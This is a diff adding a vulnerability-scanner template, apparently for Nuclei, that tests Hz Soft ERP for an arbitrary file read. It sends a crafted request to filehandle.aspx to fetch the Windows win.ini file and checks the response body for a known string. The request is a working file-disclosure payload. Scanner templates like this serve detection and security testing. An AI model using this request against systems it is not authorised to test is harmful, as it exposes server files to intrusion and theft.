@@ -1,0 +1,28 @@
+id: hz-soft-erp-fileread
+
+info:
+  name: Hz Soft ERP - File Read
+  author: qwtd
+  severity: high
+  description: |
+    This template checks for file disclosure vulnerability by attempting to access the Windows win.ini file.
+  reference:
+    - https://mp.weixin.qq.com/s/Pc8hMVlRe7C8VpbjSRvdSg
+  tags: 汇智ERP
+
+http:
+  - raw:
+      - |
+        GET /nssys/common/filehandle.aspx?filepath=C%3a%2fwindows%2fwin%2eini HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "for 16-bit app support"
+        part: body
